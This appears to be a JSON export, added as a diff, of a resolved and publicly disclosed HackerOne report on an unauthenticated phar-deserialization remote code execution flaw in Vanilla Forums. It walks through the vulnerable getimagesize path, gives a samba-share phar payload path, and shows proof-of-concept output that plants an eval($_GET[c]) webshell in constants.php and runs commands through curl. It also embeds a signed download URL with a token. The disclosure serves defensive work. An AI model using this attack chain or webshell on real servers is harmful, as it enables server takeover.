@@ -1,0 +1,166 @@
+{
+  "id": 410882,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTA4ODI=",
+  "url": "https://hackerone.com/reports/410882",
+  "title": "Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability (critical)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-17T23:05:19.946Z",
+  "submitted_at": "2018-09-17T23:05:19.946Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mr_me",
+    "url": "/mr_me",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17443,
+    "url": "https://hackerone.com/vanilla",
+    "handle": "vanilla",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Vanilla",
+      "twitter_handle": "vanilla",
+      "website": "http://vanillaforums.com",
+      "about": "Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-11-23T15:46:58.101Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-10-24T15:46:51.607Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nAn **unauthenticated** attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.\n\n## Notes:\n\n- **THIS BUG IS UNAUTHENTICATED**, however you need to have an admin account to run this poc because we leverage the file upload to get our phar file on the target.\n- The default path to the constants.php file is '/var/www/html/conf/constants.php', please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html\n- BEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!\n- In my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Windows, you could use a samba share. I have tested this and its proved to be working 100%.\n  The payload would look like phar:////attacker-share/share/poc.jpg and can be reached unauthenticated.\n- Also note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.\n\n## Analysis:\n\nInside of the library/core/functions.general.php file we can see the following code:\n\n```\nclass ImportController extends DashboardController {\n\n    ...\n\n    function fetchPageInfo($url, $timeout = 3, $sendCookies = false, $includeMedia = false) {\n        $pageInfo = [\n            'Url' => $url,\n            'Title' => '',\n            'Description' => '',\n            'Images' => [],\n            'Exception' => false\n        ];\n\n        try {\n            // Make sure the URL is valid.\n            $urlParts = parse_url($url);\n            if ($urlParts === false || !in_array(val('scheme', $urlParts), ['http', 'https'])) {\n                throw new Exception('Invalid URL.', 400);\n            }\n\n            $request = new ProxyRequest();\n            $pageHtml = $request->request([\n                'URL' => $url,\n                'Timeout' => $timeout,\n                'Cookies' => $sendCookies,\n                'Redirects' => true,\n            ]);                                                                         // 1\n\n            if (!$request->status()) {\n                throw new Exception('Couldn\\'t connect to host.', 400);\n            }\n\n\n            ...\n\n            // Page Images\n            if (count($pageInfo['Images']) == 0) {\n                $images = domGetImages($dom, $url);                                     // 2\n                $pageInfo['Images'] = array_values($images);\n            }\n```\n\nAt [1] we can reach a HTTP SSRF with an attacker controlled `$url`. Note also that there is no authentication here. Then at [2] we can reach the `domGetImages()` function with our `$url` and `$dom` which is the response from the attackers web server.\n\nContinuing inside of the library/core/functions.general.php file we can see the following code:\n\n```\n    function domGetImages($dom, $url, $maxImages = 4) {\n        $images = [];\n        foreach ($dom->query('img') as $element) {                                      // 3\n            $images[] = [\n                'Src' => absoluteSource($element->attr('src'), $url),                   // 4\n                'Width' => $element->attr('width'),\n                'Height' => $element->attr('height'),\n            ];\n        }\n\n        // Sort by size, biggest one first\n        $imageSort = [];\n        // Only look at first 4 images (speed!)\n        $i = 0;\n        foreach ($images as $imageInfo) {\n            $image = $imageInfo['Src'];                                                 // 5\n\n            if (strpos($image, 'doubleclick.') != false) {\n                continue;\n            }\n\n            try {\n                if ($imageInfo['Height'] && $imageInfo['Width']) {\n                    $height = $imageInfo['Height'];\n                    $width = $imageInfo['Width'];\n                } else {\n                    list($width, $height) = getimagesize($image);                       // 6\n                }\n```\n\nAt [3] the code looks for a img tag and at [4] it will set the `$images` array with the attackers controlled src attribute. Then at [5] the code sets the `$image` variable with the attackers controlled src. Finally at [6] we can reach the `getimagesize()` with an arbitrary string. \n\n## Exploitation:\n\nIn my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums. \nThe payload would look like phar:////attacker-share/share/poc.phar/.jpg and could be reached unauthenticated.\n\n## Example:\n\nThe following steps are used to re-create the vulnerability:\n\n1. We create our phar file:\n\n`saturn:~ mr_me$ php poc-stage-1.php`\n\n2. We run the poc-stage-2.py which will trigger the bug\n\n```\nsaturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123 172.16.175.1\n(+) targeting: http://172.16.175.143\n(+) logged in!\n(+) uploaded phar!\n(+) leaked phar name 6O51ZT69P0S4.jpg!\n(+) starting http server...\n(!) triggered callback for phar!\n(+) triggered a write!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \"http://172.16.175.143/?c=system('id');\"\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nNow, on the victim box:\n\n```\nsteven@pluto:/var/www/html/conf$ cat constants.php \n<?php if (!defined('APPLICATION')) exit();\n$a=eval($_GET[c]);//[''] = '';\n\n// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$\n```\n\n## References:\n\n- https://rdot.org/forum/showthread.php?t=4379\n\n## Impact\n\nAn unauthenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.",
+  "bounty_amount": "600.0",
+  "formatted_bounty": "$600",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 347520,
+      "file_name": "vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/347/520/89a8e73e0a1e58ae204f98e45793f15f28cfbd7b/vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip?response-content-disposition=attachment%3B%20filename%3D%22vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip%22%3B%20filename%2A%3DUTF-8%27%27vanilla_forums_domGetImages_getimagesize_unserialize_rce.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ4ABT4GR%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131114Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIBy6B6CaeGOQsHQEVf6mmFMeFsyrU6xwojWydbGY7RrjAiEAt098VbuwY4XR0q%2FhT1%2BwOM5SQIHiByhn7YH5ul9I%2Bn0qsQUIdRADGgwwMTM2MTkyNzQ4NDkiDFBaVga66U2cxXTWDSqOBZ9tNE39KmDEn1M4BXloMcPBeBllafRlZWXN4mbzGTLJ8XKW77G1i6rQMiYeX0mALiTgT6%2BCHJg%2FXOkgcCoWTiU8AGVS8ygbrG6Rmef84ITNYSRHXYOiAmAtLriRM0FNkbvdPDxzRHKptbdJe%2FxQx6iHxnF4Wbz2d%2BiPKmLG1dOUk9Wd5PcY6e%2FpFK3MQHhbP60DtFaNSQZiLijq7McbVpknudWszl6E666zMtQlGzHcdmQhcfLUGV%2Fh2eQIW07Q8StsP0DnifOlRfH5wmBWZeOVGiQmAiu4vix6Kx70b5sEUa60B8XEzX3iLRbRpvoMJI2iFfwEhBUfyAO2kQFI891jfDtZMWBRAeJzS2TDBSZOFWdllL1Ku5BlluxzcTwgDBcj6U9BeRoIR%2FE%2F%2FzJhFrI6sO4C9sHXlsgFD4n6%2BV%2BMht3eSvRmwlqvwAGbQgoXg1TnmoDMTwU9bHj7KKScAqVQBI8hZ2NsP8SjJg8QJ0z%2BQTTuA8uOznjEUpW73jDmEQTBVhmpeZcwxP4%2BU6nQB8LguHWkl5NBmrNRrQGJGWsRxHHT40HVpMkdUBcHLz%2BE4kW3xThQV2%2FnlNJrQbkP9idnhRNm421huVhZIih2gBVsmfHNfFtpBWAgyhZal1fyaA5PfM8x1h1HAwbgAbx5pWpwX6P35EkSqglhC9hYX4Mx81Hh8c9ng5X9OnjAGOW2svJkxKq9ucSCCtD2ch3QThvWYUo6MweIyhK%2Fc7x1IsUKbcstBILZpn1l%2BukPwZKsmW0eclxFPYN5toUHjUictBuWWthA5Xkwhoewwr4uhuDUwpqTTEYBtxfAUMWwC9b4A0nNdO5YVjG1Et5gL7AXZuOawjRSr2cgQxq4C6b5gjDCs62uBjqxAShKZyKgt2m88YD0Vj8P6tXU495dvL8RKU8No53RBpg%2B0AGbaXTXUqyqWqfJgpK4Oo5BMDBxlCeUem5zsmh5i1y96ARljDRINVqBbClSxSFkigseR0xhxtkfysRfAXQQYk56acdX1y%2FUUtxG304UkKPWzZsl%2FZfaTuT815tCTUHh387Az8zDogkBD5OMCSblOcOAbl2D84THnFg9dMo8QXW7aVKysLeRwOxI5twdQX9Gug%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=58302ab0ede696e3e0b8c84f4d4a1317ace739b48d81afdadd98d4c7c93b3b4c",
+      "file_size": 150759,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-11-23T15:46:51.645Z",
+  "allow_singular_disclosure_after": -164841863.28613603,
+  "singular_disclosure_allowed": true,
+  "vote_count": 32,
+  "voters": [
+    "irek",
+    "fqdn",
+    "inhibitor181",
+    "sameerphad72",
+    "spam404",
+    "ali",
+    "ahiezer",
+    "theappsec",
+    "harry_mg",
+    "kunal94",
+    "and 22 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2101,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.vanillaforums.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 10567,
+      "category": "researcher",
+      "content": "An **unauthenticated** attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.",
+      "user": {
+        "id": 41443,
+        "username": "mr_me",
+        "name": "Steven Seeley",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://srcincite.io/",
+        "location": "",
+        "created_at": "2015-10-08T18:38:12.546Z",
+        "url": "https://hackerone.com/mr_me",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
